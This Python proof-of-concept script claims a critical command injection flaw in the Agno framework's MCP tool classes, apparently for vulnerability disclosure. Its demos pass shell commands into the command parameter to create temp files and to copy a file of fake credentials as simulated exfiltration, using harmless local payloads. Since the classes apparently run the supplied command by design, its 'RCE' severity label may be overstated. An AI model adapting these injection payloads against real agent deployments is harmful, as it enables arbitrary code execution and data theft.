#!/usr/bin/env python3
"""
🚨 Agno MCP Command Injection Vulnerability PoC
This script demonstrates the command injection vulnerability in Agno's MCP integration.

⚠️  Warning: This script is for security research and vulnerability demonstration purposes only!
"""

import asyncio
import os
import sys
import tempfile
from pathlib import Path

# Add the libs path to import agno modules
sys.path.insert(0, str(Path(__file__).parent / "libs"))

try:
    from agno.tools.mcp import MCPTools, MultiMCPTools
    print("✅ Successfully imported Agno MCP modules")
except ImportError as e:
    print(f"❌ Failed to import Agno modules: {e}")
    print("Please ensure you're running this from the agno project root directory")
    sys.exit(1)


async def demonstrate_single_command_injection():
    """Demonstrate command injection through MCPTools single command parameter."""
    print("\n🚨 [PoC 1] Single Command Injection via MCPTools")
    print("=" * 60)
    
    # Create a temporary file to prove command execution
    temp_file = tempfile.mktemp(suffix=".txt", prefix="agno_vuln_proof_")
    
    # Malicious command that creates a file to prove execution
    malicious_command = f"python3 -c 'import os; os.system(\"touch {temp_file}\"); print(\"Command executed successfully!\")'"
    
    print(f"🎯 Target: MCPTools(command='{malicious_command}')")
    print(f"📁 Proof file: {temp_file}")
    
    try:
        # This should trigger the vulnerability
        print("🚀 Attempting command injection...")
        
        # The vulnerability occurs during MCPTools initialization
        # The malicious command gets parsed by shlex.split() and passed to StdioServerParameters
        async with MCPTools(command=malicious_command) as tools:
            print("⚠️  MCPTools context entered - command may have been executed")
            
    except Exception as e:
        print(f"⚠️  Exception occurred (expected): {e}")
        print("⚠️  But the malicious command may still have been executed!")
    
    # Check if the proof file was created
    if os.path.exists(temp_file):
        print(f"🚨 VULNERABILITY CONFIRMED: Proof file {temp_file} was created!")
        print("🚨 This proves arbitrary command execution occurred!")
        # Clean up
        os.remove(temp_file)
        return True
    else:
        print(f"ℹ️  Proof file {temp_file} not found - command may not have executed")
        return False


async def demonstrate_multi_command_injection():
    """Demonstrate command injection through MultiMCPTools commands parameter."""
    print("\n🚨 [PoC 2] Multi Command Injection via MultiMCPTools")
    print("=" * 60)
    
    # Create temporary files to prove multiple command execution
    temp_file1 = tempfile.mktemp(suffix=".txt", prefix="agno_vuln_multi1_")
    temp_file2 = tempfile.mktemp(suffix=".txt", prefix="agno_vuln_multi2_")
    
    # Multiple malicious commands
    malicious_commands = [
        f"python3 -c 'import os; os.system(\"touch {temp_file1}\"); print(\"First command executed!\")'",
        f"python3 -c 'import os; os.system(\"touch {temp_file2}\"); print(\"Second command executed!\")'"
    ]
    
    print(f"🎯 Target: MultiMCPTools(commands={malicious_commands})")
    print(f"📁 Proof files: {temp_file1}, {temp_file2}")
    
    try:
        print("🚀 Attempting multi-command injection...")
        
        # The vulnerability occurs during MultiMCPTools initialization
        # Each malicious command gets parsed and passed to StdioServerParameters
        async with MultiMCPTools(commands=malicious_commands) as tools:
            print("⚠️  MultiMCPTools context entered - commands may have been executed")
            
    except Exception as e:
        print(f"⚠️  Exception occurred (expected): {e}")
        print("⚠️  But the malicious commands may still have been executed!")
    
    # Check if proof files were created
    success_count = 0
    for i, temp_file in enumerate([temp_file1, temp_file2], 1):
        if os.path.exists(temp_file):
            print(f"🚨 VULNERABILITY CONFIRMED: Proof file {i} ({temp_file}) was created!")
            os.remove(temp_file)
            success_count += 1
        else:
            print(f"ℹ️  Proof file {i} ({temp_file}) not found")
    
    if success_count > 0:
        print(f"🚨 {success_count}/2 malicious commands executed successfully!")
        return True
    else:
        print("ℹ️  No proof files found - commands may not have executed")
        return False


async def demonstrate_data_exfiltration_simulation():
    """Simulate data exfiltration attack (safe demonstration)."""
    print("\n🚨 [PoC 3] Data Exfiltration Simulation")
    print("=" * 60)
    
    # Create a temporary "sensitive" file to simulate exfiltration
    sensitive_file = tempfile.mktemp(suffix=".txt", prefix="sensitive_data_")
    exfil_file = tempfile.mktemp(suffix=".txt", prefix="exfiltrated_")
    
    # Create fake sensitive data
    with open(sensitive_file, 'w') as f:
        f.write("SENSITIVE_API_KEY=sk-1234567890abcdef\n")
        f.write("DATABASE_PASSWORD=super_secret_password\n")
        f.write("USER_DATA=confidential_information\n")
    
    # Malicious command that "exfiltrates" data (copies to another file)
    malicious_command = f"python3 -c 'import shutil; shutil.copy(\"{sensitive_file}\", \"{exfil_file}\"); print(\"Data exfiltrated!\")'"
    
    print(f"🎯 Simulating data exfiltration attack")
    print(f"📄 Sensitive file: {sensitive_file}")
    print(f"📤 Exfiltration target: {exfil_file}")
    
    try:
        print("🚀 Attempting data exfiltration...")
        
        async with MCPTools(command=malicious_command) as tools:
            print("⚠️  MCPTools context entered - exfiltration may have occurred")
            
    except Exception as e:
        print(f"⚠️  Exception occurred (expected): {e}")
        print("⚠️  But data exfiltration may still have occurred!")
    
    # Check if exfiltration was successful
    if os.path.exists(exfil_file):
        print(f"🚨 DATA EXFILTRATION CONFIRMED: File copied to {exfil_file}")
        with open(exfil_file, 'r') as f:
            content = f.read()
            print("🚨 Exfiltrated content:")
            print(content)
        
        # Clean up
        os.remove(sensitive_file)
        os.remove(exfil_file)
        return True
    else:
        print("ℹ️  Exfiltration file not found - attack may not have succeeded")
        if os.path.exists(sensitive_file):
            os.remove(sensitive_file)
        return False


async def main():
    """Main function to run all PoC demonstrations."""
    print("🚨 Agno MCP Command Injection Vulnerability PoC")
    print("=" * 60)
    print("⚠️  This script demonstrates critical security vulnerabilities")
    print("⚠️  in the Agno framework's MCP integration.")
    print("⚠️  Use only for authorized security testing!")
    print()
    
    # Track successful demonstrations
    successful_pocs = []
    
    # Run PoC demonstrations
    try:
        if await demonstrate_single_command_injection():
            successful_pocs.append("Single Command Injection")
    except Exception as e:
        print(f"❌ PoC 1 failed with error: {e}")
    
    try:
        if await demonstrate_multi_command_injection():
            successful_pocs.append("Multi Command Injection")
    except Exception as e:
        print(f"❌ PoC 2 failed with error: {e}")
    
    try:
        if await demonstrate_data_exfiltration_simulation():
            successful_pocs.append("Data Exfiltration Simulation")
    except Exception as e:
        print(f"❌ PoC 3 failed with error: {e}")
    
    # Summary
    print("\n" + "=" * 60)
    print("🚨 VULNERABILITY DEMONSTRATION SUMMARY")
    print("=" * 60)
    
    if successful_pocs:
        print(f"✅ {len(successful_pocs)}/3 PoC demonstrations successful:")
        for poc in successful_pocs:
            print(f"   - {poc}")
        print()
        print("🚨 CRITICAL VULNERABILITY CONFIRMED!")
        print("🚨 The Agno MCP integration allows arbitrary command execution!")
        print("🚨 Immediate patching is required!")
    else:
        print("ℹ️  No PoC demonstrations were successful.")
        print("ℹ️  This may indicate the vulnerability is not exploitable")
        print("ℹ️  in the current environment or configuration.")
    
    print("\n📋 Vulnerability Details:")
    print("   - Location: libs/agno/agno/tools/mcp.py")
    print("   - Affected Classes: MCPTools, MultiMCPTools")
    print("   - Root Cause: Insufficient input validation in command parameter")
    print("   - Impact: Remote Code Execution (RCE)")
    print("   - Severity: Critical")


if __name__ == "__main__":
    asyncio.run(main())
